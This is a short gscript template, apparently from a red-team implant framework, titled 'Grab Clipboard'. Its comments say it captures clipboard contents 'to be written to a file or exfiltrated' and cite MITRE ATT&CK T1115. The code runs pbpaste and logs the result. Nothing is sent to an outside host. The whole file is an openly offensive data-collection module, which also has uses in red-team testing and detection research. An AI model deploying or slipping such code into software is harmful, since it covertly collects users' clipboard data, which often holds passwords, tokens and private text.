// Example gscript template
// Title: Grab Clipboard
// Author: ahhh
// Purpose: Grabs the contents of the clipboard to be written to a file or exfiltrated
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1115

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Starting Clipboard Data");
  return true; 
}

function Deploy() {  
  var response = ExecuteCommand("pbpaste", [""]);
  LogInfo(response.retObject.Stdout);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Clipboard Data");
  return true;
}